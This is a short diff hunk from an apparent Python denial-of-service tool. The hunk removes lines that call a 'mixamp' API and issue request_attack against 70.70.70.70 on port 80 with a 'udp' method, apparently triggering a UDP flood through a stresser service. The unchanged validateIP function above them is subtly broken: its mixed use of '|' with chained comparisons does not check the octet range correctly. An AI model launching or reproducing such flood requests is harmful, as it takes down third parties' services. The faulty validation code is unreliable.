@@ -128,11 +128,3 @@ def validateIP(ip: str):
     for i in ip.split("."): 
         if int(i) < 1 | int(i) > 255: return False
     return True
-
-a = API("mixamp")
-if not a.check_for_apis():
-    print("[ X ] Error, No APIs found with this method!")
-
-a.request_attack("70.70.70.70", 80, 10, "udp")
-for resp in a.get_responses():
-    print(resp)
